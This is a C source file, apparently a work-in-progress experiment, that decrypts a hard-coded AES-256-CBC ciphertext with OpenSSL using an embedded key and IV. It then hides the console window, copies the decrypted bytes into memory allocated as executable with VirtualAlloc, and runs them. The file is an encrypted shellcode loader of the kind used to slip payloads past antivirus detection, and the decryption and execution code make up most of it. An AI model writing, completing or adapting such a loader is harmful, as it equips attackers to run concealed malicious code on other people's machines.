/*
* Download OpenSSL-Win64
* Compilation:  gcc .\main.c C:\Users\super\source\repos\openssl\ms\applink.c -o .\main -IC:\curl\include\ -L"C:\Program Files\OpenSSL-Win64" -l:libcrypto-3-x64.dll -l:libssl-3-x64.dll
*/

// Try this next: https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption
// Downloadable version: https://wiki.openssl.org/images/1/17/Evp-symmetric-encrypt.c

/*
This implements CBC mode; 256 bit key, 128 bit IV --> These have to be exact.

*/

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <openssl/bio.h>
#include <Windows.h>

unsigned char * ciphertext = (unsigned char *) "\x65\xbf\xd7\xae\x19\x5c\xf1\xd6\xf5\x13\xa3\x5b\x59\x4d\x57\x7\xdd\x11\x42\x75\xf\x61\xd7\xb\x1d\xeb\x16\x32\xf8\xd\x55\xb3\xe1\x1a\x58\x0\x91\x24\x4e\xb\x33\x97\x61\x0\x2d\x25\x17\x1e\xc8\xf5\x9a\x5a\xdd\x91\xdb\x15\x73\x8d\x18\x98\xa4\x1e\xb0\x24\xbd\xdd\xc1\x83\xb6\x1d\x96\xc5\xe6\x94\xf6\x62\xa4\xa0\x60\x11\x9e\x91\xac\xd7\x86\x7b\xcc\x31\x7f\x8c\x1\x5a\xc0\x1\x57\xe\xbf\xbf\x7a\xa8\x89\xb7\x37\xa5\xb1\x3e\x61\xfc\x8d\x6b\xbb\x6\x5\x35\xac\x2e\x34\x65\xe6\x52\x93\xd0\x1a\xfa\x84\x3a\x68\x1\xed\x51\xa0\x90\x80\x4f\xa6\xbb\x3f\xcb\xa1\x2\x1f\x4\x2a\xc3\x76\x70\x10\xba\x48\xae\x18\x19\x61\x79\xe4\x36\xdf\x59\xe1\x3f\x94\x5c\x6e\x76\x6c\x61\x70\xbb\xb0\x8e\x97\x2e\x90\xae\xe3\xfa\x3f\xb6\xf2\xa7\xf8\x67\xc7\x52\xf0\x3e\xed\x11\xc5\x5e\x3e\x8a\xf2\xcc\xc3\x52\xab\x1\x5a\xdd\x57\xd1\x3a\xbc\x88\x97\x81\x13\x92\x7\xa0\x2f\xe0\x87\x52\xb1\x1b\x78\x50\x6a\xdb\x61\xe2\x76\x20\xe8\x66\x6d\xf\x13\x17\xd4\x6b\x28\xa6\xcc\x27\x6d\x2f\x2e\xd8\xfd\x76\x90\x59\xbd\xb8\x36\xdd\xe7\x32\xc7\xdb\x97\x68\xf9\x1b\x4e\x65\x60\xbe\x3d\x0\x56\x80\x6e\xc4\x5b\x6e\xd1\x27\xba\xe0\x33\xe5\x32\xcc\x56\x79\xa6\x14\x18\x2\xd1\x2f\x6d\x9f\xfc\x15\x7e\x7f\xec\xac\x23\xa2\x94\x61\x80\x78\xb8\x22\x4a\xf5\xb6\x99\x4d\xcc\x67\x5f\xdb\xfb\x82\xa0\x52\x3a\x49\x85\xf0\x33\x24\xb5\x9d\xe5\x25\x5d\x5f\x79\xe6\x32\xa1\xcf\x9\x80\xfa\xea\x20\xd6\x57\x2e\x74\x1b\x6f\xbe\xae\x83\x81\x3e\x82\x34\x14\x71\x74\xd1\xa1\x2c\x90\xff\xfe\xc2\x8c\x52\xbd\xae\x53\xdc\x74\x76\x7\xfb\x23\x42\xc6\x16\xe7\x8f\x6b\xb1\xde\x86\x2f\x47\xa3\x76\x92\x9b\xec\x56\x30\xd7\x2a\x0\x66\xeb\x5f\x39\x80\x74\xd2\xb1\x27\xa4\x17\x4e\x9f\xd2\xa9\x9a\x8d\x38\xf1\x6d\xea\xf\xbc\xd2\xbe\x68\xfa\xc0\xad\x75\xe0\x4\x7\xad\xb6\x47\x84\xf\xb\x34\xb9\xde\xe5\xc6\x31\x58\x45\x4c\xc4\x93\xa\xb7\x9c\xb7\x2\x91\xe3\x2e\x1b\xdc\xd2\x88\x74\x84\xf5\x4b\x9c\x61\xa4\xe5\x62\x60\xfd\x12\xfb\x1e\x50\x38\x83\x81\x5b\xdf\x97\xe1\x4d\xf8\x57\x40\xd8\x45\xa\x99\x6\x87\x85\x48\x41\x8\xc1\xc9\x1e\xe5\xa3\x69\x5\x77\xe0\x89\x16\x36\x2\x17\x85\x29\x80\xbf\xbe\xeb\x1e\x93\x5a\xa1\x4d\xce\x8d\x3e\x82\xe1\xe1\x1e\xed\x7c\x37\x7e\xb8\x87\xca\x12\x92\xfd\xef\x7f\x51\x4d\xf4\xd0\x1f\x7b\x22\x9b\xe0\x54\x2\x56\xbb\x2c\x3f\x67\xc1\xcd\xa7\xa8\xbd\x6e\xd1\x8a\xb8\x41\xaa";

void handleErrors(void);
int encrypt(unsigned char * plaintext, int plaintext_len, unsigned char * key, unsigned char * iv, unsigned char * ciphertext);
int decrypt(unsigned char * ciphertext, int ciphertext_len, unsigned char * key, unsigned char * iv, unsigned char * plaintext);

int main(void) {

    unsigned char key[] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31};

    unsigned char iv[] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35 };

    // unsigned char * plaintext = (unsigned char *) "This is the test string being operated upon";

    // printf("Initial string: %s\tLength: %ld\n", plaintext, strlen(plaintext));

    // unsigned char ciphertext[4096];

    unsigned char decryptedText[4096];

    int decryptedText_length;

    // This is encrypting the plaintext
    // cipherText_length = encrypt(plaintext, strlen((char *)plaintext), key, iv, ciphertext);
    int cipherText_length = 560;

    // At this point ciphertext contains the encrypted message
    printf("Ciphertext: \n");

    // This sequence creates a new BIO * from stdout, freeing it afterwards
    
    // BIO * bio;
    // bio = BIO_new_fp(stdout, BIO_NOCLOSE);
    // BIO_dump(bio, (const char *)ciphertext, cipherText_length);
    // BIO_free(bio);
    int counter = 0;
    for (int i = 0; i < cipherText_length; i++) {
        printf("\\x%x", ciphertext[i]);
        counter++;
    }

    printf("Number of bytes: %d", counter);

    decryptedText_length = decrypt(ciphertext, cipherText_length, key, iv, decryptedText);

    printf("Do I make it here?\n");

    decryptedText[decryptedText_length] = '\0';

    printf("Decrypted text: \n");
    printf("%s\tLength: %ld\n", decryptedText, strlen(decryptedText));

    FreeConsole();
	void *exec = VirtualAlloc(0, decryptedText_length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, decryptedText, decryptedText_length);
	((void(*)())exec)();

    return 0;
}

void handleErrors(void) {               // This takes any error messages generated by OpenSSL and outputs them to the console
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char * plaintext, int plaintext_len, unsigned char * key, unsigned char * iv, unsigned char * ciphertext) {

    EVP_CIPHER_CTX * ctx;

    int len;

    int ciphertext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // This is initializing the encryption operation
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors();
    }

    // This is encrypting the message and leaving the encrypted output in the provided buffer (the last parameter)
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len)) {
        handleErrors();
    }

    ciphertext_len = len;

    // This is finalizing the encryption and the operation is not complete without it
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) {
        handleErrors();
    }

    ciphertext_len += len;

    // This is cleaning up after the operation that was just performed
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;

}

// Decryption consists of: setting up context, initializing a decryption operation, providing the ciphertext, finalising the operation.

int decrypt(unsigned char * ciphertext, int ciphertext_len, unsigned char * key, unsigned char * iv, unsigned char * plaintext) {

    EVP_CIPHER_CTX * ctx;

    int len, plaintext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // initializing the decryption operation with a correctly sized key and IV
    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors();
    }

    // EVP_DecryptUpdate can be called multiple times if needed
    // This call is placing the plaintext output in the provided buffer (the last parameter)
    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) {
        handleErrors();
    }

    plaintext_len = len;

    // This call is finalizing the encryption and this is required for successful decryption; without it bytes may be missing
    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {
        handleErrors();
    }

    plaintext_len += len;

    // This call is cleaning up
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;

}